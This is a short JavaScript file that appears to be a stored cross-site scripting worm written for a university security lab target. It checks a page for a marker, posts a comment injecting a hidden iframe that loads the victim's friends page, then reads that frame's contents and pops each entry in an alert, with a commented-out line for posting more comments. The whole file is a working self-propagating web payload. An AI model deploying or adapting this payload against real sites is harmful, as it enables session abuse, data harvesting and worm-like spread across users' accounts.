function moveitmoveit() {
    //var home = $.get("http://csec380-core.csec.rit.edu:86/home.php", function(data) {return data} , "html");
    var home = $.ajax({
        async: false,
        type: 'GET',
        url: 'http://csec380-core.csec.rit.edu:86/home.php',
        success: function(data) {
            return data;
        }
    });
    if (home.responseText.match("<iframe id='hiddenboi'") == null){
        $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{ comment: '<iframe id="hiddenboi" src="http://csec380-core.csec.rit.edu:86/friends.php"></iframe>'});
    }
    var eff = document.getElementById("hiddenboi");
    alert(2);
    eff.addEventListener("load",function(){
       var conter= eff.contentWindow.document.body.innerHTML.match('^[^<br]*');
       var stringy = conter.join();
       var arr = stringy.split(',');
       for( var i = 0; i < arr.length; i++){
           //  $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{id: 131,comment: 'Boi'});
           alert(arr[i]);
        
       } 
     });
}
moveitmoveit();
